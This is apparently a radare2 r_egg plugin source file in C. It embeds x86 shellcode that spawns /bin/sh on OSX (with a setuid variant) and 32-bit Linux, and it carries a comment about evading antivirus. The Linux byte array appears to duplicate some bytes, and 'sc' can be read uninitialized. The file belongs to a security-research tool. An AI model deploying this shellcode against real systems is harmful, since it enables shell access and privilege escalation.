/* radare - LGPL - Copyright 2011 pancake<@nopcode.org> */
#include <r_egg.h>

// XXX: must obfuscate to avoid antivirus
// OSX
static ut8 x86_osx_suid_binsh[] =
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
	/* suid */ "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";
static ut8 x86_osx_binsh[] =
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
	// SUIDSH "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";

// linux
static ut8 x86_linux_binsh[] =
        "\x31\xc0\x50\x68"
        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	"//sh\x68/bin"
        "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

static RBuffer *build (REgg *egg) {
	RBuffer *buf = r_buf_new ();
	const ut8 *sc;
	int cd = 0;
	char *shell = r_egg_option_get (egg, "cmd");
	char *suid = r_egg_option_get (egg, "suid");
	// TODO: last char must not be \x00 .. or what? :D
	if (suid && *suid=='f') { // false
		free (suid);
		suid = NULL;
	}
	switch (egg->os) {
	case R_EGG_OS_OSX:
	case R_EGG_OS_DARWIN:
		if (suid) {
			sc = x86_osx_suid_binsh;
			cd = 7+36;
		} else {
			sc = x86_osx_binsh;
			cd = 36;
		}
		break;
	case R_EGG_OS_LINUX:
		if (suid) eprintf ("no suid for this platform\n");
		suid = 0;
		if (egg->bits == 32) {
			sc = x86_linux_binsh;
		} else eprintf ("Unsupportted\n");
		break;
	default:
		printf ("unsupported os %x\n", egg->os);
		break;
	}
	if (sc) {
		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
		if (shell && *shell) {
			if (cd) r_buf_write_at (buf, cd, (const ut8*)shell, strlen (shell)+1);
			else eprintf ("Cannot set shell\n");
		}
	}
	free (suid);
	free (shell);
	return buf;
}

//TODO: rename plugin to run
REggPlugin r_egg_plugin_exec = {
	.name = "exec",
	.type = R_EGG_PLUGIN_SHELLCODE,
	.bits = 32|64,
	.desc = "execute cmd=/bin/sh suid=false",
	.build = (void *)build
};

#ifndef CORELIB
struct r_lib_struct_t radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_exec
};
#endif
